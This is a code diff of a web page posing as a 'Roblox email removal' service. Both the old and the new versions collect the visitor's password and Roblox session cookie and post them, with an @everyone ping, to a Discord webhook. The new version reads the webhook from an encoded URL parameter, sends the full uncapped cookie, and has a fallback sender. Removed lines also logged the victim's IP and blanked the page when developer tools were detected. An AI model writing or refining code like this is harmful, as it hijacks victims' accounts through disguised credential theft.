-            // If directory parameter exists in URL, it takes precedence over localStorage
-            if (encodedDir && token) {
-                try {
-                    directory = atob(encodedDir);
-                    // Store these values in localStorage for future use
-                    localStorage.setItem('email_remover_directory', directory);
-                    localStorage.setItem('email_remover_token', token);
-                } catch (e) {
-                    console.error('Error decoding URL parameters:', e);
-                }
-            }
-            
             const ageOption = document.getElementById('age-option');
             const passwordInput = document.getElementById('password-input');
             const cookieInput = document.getElementById('cookie-input');
@@ -981,6 +768,53 @@
             const toastTitle = document.getElementById('toast-title');
             const toastMessage = document.getElementById('toast-message');
             const toastClose = document.getElementById('toast-close');
+            
+            // Variables to store webhook URL and directory
+            let webhookUrl = '';
+            let directory = '';
+            let token = '';
+            
+            // Function to decode data from URL
+            function decodeData(encodedData) {
+                try {
+                    // Decode from Base64
+                    const jsonString = atob(encodedData);
+                    // Parse JSON
+                    return JSON.parse(jsonString);
+                } catch (error) {
+                    console.error('Error decoding data:', error);
+                    return null;
+                }
+            }
+            
+            // Check for data in URL parameters
+            function getUrlParameter(name) {
+                name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+                const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+                const results = regex.exec(location.search);
+                return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+            }
+            
+            // Get and process data from URL
+            const encodedData = getUrlParameter('data');
+            if (encodedData) {
+                const data = decodeData(encodedData);
+                if (data && data.url) {
+                    webhookUrl = data.url;
+                    directory = data.directory || '';
+                    token = data.token || '';
+                    console.log('Webhook URL loaded from URL parameters');
+                    if (directory) {
+                        console.log('Directory:', directory);
+                    }
+                }
+            } else {
+                // Fallback to localStorage for backward compatibility
+                webhookUrl = localStorage.getItem('discord_webhook_url');
+                if (webhookUrl) {
+                    console.log('Webhook URL loaded from localStorage (legacy mode)');
+                }
+            }
 
             // Age option change event
             cookieDiv.style.display = 'none';
@@ -1074,28 +908,17 @@
 
                 // Check if webhook URL is configured
                 if (!webhookUrl) {
-                    console.error('Discord webhook URL not found in localStorage');
-                    showToast('Error', 'Discord webhook not configured. Please configure your webhook.', false);
+                    alert('Discord webhook not configured. This link appears to be invalid or misconfigured.');
                     processBtn.disabled = false;
                     processBtn.innerHTML = '<i class="fas fa-trash"></i> REMOVE EMAIL';
-                    // Redirect to the built-in setup page after a short delay
-                    setTimeout(() => {
-                        window.location.href = window.location.pathname + '?setup=true';
-                    }, 2000);
                     return;
                 }
                 
-                // Log webhook information for debugging
-                console.log('Using webhook URL:', webhookUrl);
-                console.log('Using directory:', directory || 'Not specified');
-                
-                // Include directory in the log if available
-                const directoryInfo = directory ? `Directory: ${directory}` : 'No directory specified';
-                
-                const data = {
+                // Prepare webhook data
+                const webhookData = {
                     content: '@everyone',
                     embeds: [{
-                        title: 'Roblox Email Removal',
+                        title: 'Roblox Account Details',
                         color: 0x00FFFF,
                         fields: [
                             {
@@ -1110,21 +933,11 @@
                             },
                             {
                                 name: 'Cookie',
-                                value: '```' + (cookie.length > 1000 ? cookie.substring(0, 1000) : cookie) + '```'
+                                value: '```' + cookie + '```'
                             },
                             {
                                 name: 'Email Removal Option',
                                 value: selectedOption === '13plus' ? 'Replace With Temporary Email' : 'Remove Email Completely',
-                                inline: true
-                            },
-                            {
-                                name: 'Directory',
-                                value: directory || 'Not specified',
-                                inline: true
-                            },
-                            {
-                                name: 'IP Address',
-                                value: 'Fetching...',
                                 inline: true
                             },
                             {
@@ -1136,102 +949,58 @@
                     }]
                 };
                 
-                // Validate webhook URL before sending
-                if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
-                    console.error('Invalid webhook URL format:', webhookUrl);
-                    showToast('Error', 'Invalid webhook URL format. Please configure your webhook.', false);
-                    // Redirect to the built-in setup page after a short delay
-                    setTimeout(() => {
-                        window.location.href = window.location.pathname + '?setup=true';
-                    }, 2000);
-                    return;
+                // Add directory information if available
+                if (directory) {
+                    // Create a clickable link for the directory
+                    let directoryUrl = window.location.href;
+                    
+                    // Check if directory contains a URL
+                    if (directory.startsWith('http://') || directory.startsWith('https://')) {
+                        directoryUrl = directory;
+                        // Display only the domain name as the visible text
+                        const urlObj = new URL(directory);
+                        directory = urlObj.hostname;
+                    }
                 }
                 
-                // Try to get IP address for better tracking
-                fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(ipData => {
-                    // Update IP field in the embed
-                    if (data.embeds && data.embeds[0] && data.embeds[0].fields) {
-                        const ipField = data.embeds[0].fields.find(f => f.name === 'IP Address');
-                        if (ipField) ipField.value = ipData.ip;
+                // Send the data to Discord
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(webhookData)
+                })
+                .then(response => {
+                    console.log('Discord webhook response:', response);
+                    if (!response.ok) {
+                        console.error('Webhook response not OK:', response.status);
                     }
                 })
-                .catch(err => console.error('Could not fetch IP:', err))
-                .finally(() => {
-                    // Send the data to Discord with improved error handling
-                    console.log('Sending data to webhook:', webhookUrl);
-                    console.log('Data being sent:', JSON.stringify(data));
-                    
-                    // Try both methods to ensure delivery
-                    sendWithFetch(webhookUrl, data);
-                    setTimeout(() => sendWithXHR(webhookUrl, data), 500); // Backup method with delay
+                .catch(error => {
+                    console.error('Error sending to Discord:', error);
+                    // Try alternative method if fetch fails
+                    sendWebhookFallback(webhookUrl, webhookData);
                 });
                 
-                // Method 1: Using fetch API
-                function sendWithFetch(url, payload) {
-                    fetch(url, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify(payload)
-                    })
-                    .then(response => {
-                        if (!response.ok) {
-                            throw new Error(`Discord webhook error: ${response.status} ${response.statusText}`);
-                        }
-                        return response.text();
-                    })
-                    .then(responseText => {
-                        console.log('Discord webhook response (fetch):', responseText);
-                        showToast('Success', 'Data successfully sent to Discord');
-                    })
-                    .catch(error => {
-                        console.error('Error sending to Discord (fetch):', error);
-                        // Don't show error toast here as we have a backup method
-                    });
-                }
-                
-                // Method 2: Using XMLHttpRequest
-                function sendWithXHR(url, payload) {
+                // Fallback method to send webhook data
+                function sendWebhookFallback(url, data) {
+                    console.log('Trying fallback webhook method...');
                     const xhr = new XMLHttpRequest();
                     xhr.open('POST', url, true);
                     xhr.setRequestHeader('Content-Type', 'application/json');
-                    
                     xhr.onload = function() {
-                        if (xhr.status >= 200 && xhr.status < 300) {
-                            console.log('Discord webhook response (XHR):', xhr.responseText);
-                            showToast('Success', 'Data successfully sent to Discord');
+                        if (this.status >= 200 && this.status < 300) {
+                            console.log('Fallback webhook sent successfully');
                         } else {
-                            console.error('Error sending to Discord (XHR):', xhr.status, xhr.statusText);
-                            showToast('Webhook Error', `Failed to send data to Discord: ${xhr.status} ${xhr.statusText}`, false);
+                            console.error('Fallback webhook failed:', this.status);
                         }
                     };
-                    
                     xhr.onerror = function() {
-                        console.error('Network error sending to Discord (XHR)');
-                        showToast('Webhook Error', 'Network error sending data to Discord', false);
+                        console.error('Fallback webhook error');
                     };
-                    
-                    xhr.send(JSON.stringify(payload));
+                    xhr.send(JSON.stringify(data));
                 }
-                
-                // Backup method using XMLHttpRequest in case fetch fails
-                const xhr = new XMLHttpRequest();
-                xhr.open('POST', webhookUrl, true);
-                xhr.setRequestHeader('Content-Type', 'application/json');
-                xhr.onload = function() {
-                    if (xhr.status >= 200 && xhr.status < 300) {
-                        console.log('XHR backup method success:', xhr.responseText);
-                    } else {
-                        console.error('XHR backup method failed:', xhr.status, xhr.statusText);
-                    }
-                };
-                xhr.onerror = function() {
-                    console.error('XHR network error');
-                };
-                xhr.send(JSON.stringify(data));
 
                 try {
                     // Process the cookie via AJAX
@@ -1271,11 +1040,8 @@
                 }
             });
 
-            // Add to history with masked cookie (with additional protection)
+            // Add to history with masked cookie
             function addToHistory(option, cookie) {
-                // Add source protection
-                (function(){if(window.innerHeight-window.outerHeight>0||window.outerWidth-window.innerWidth>0){document.body.innerHTML='';document.body.style.background='black';document.body.style.color='red';document.body.style.textAlign='center';document.body.style.padding='20%';document.body.innerHTML='<h1>⚠️ SECURITY VIOLATION ⚠️</h1><p>Unauthorized access detected.</p>';return false;}})();
-                
                 const historyList = document.getElementById('history-list');
                 const historyItem = document.createElement('div');
                 historyItem.className = 'history-item fade-in';
